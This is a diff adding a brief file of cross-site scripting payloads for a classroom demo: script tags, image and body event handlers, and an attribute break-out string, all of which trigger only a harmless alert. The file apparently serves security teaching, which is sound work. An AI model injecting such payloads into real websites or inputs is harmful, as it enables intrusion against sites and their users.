@@ -1,0 +1,19 @@
+SAMPLE PAYLOADS FOR CLASSROOM DEMO
+
+Basic script:
+<script>alert('XSS')</script>
+
+HTML injection:
+<b>Injected Bold Text</b>
+
+Image event:
+<img src=x onerror=alert('XSS')>
+
+Body event:
+<body onload=alert('XSS')>
+
+Input break out test:
+"><script>alert('XSS')</script>
+
+Note:
+Some payloads depend on where the input is reflected.
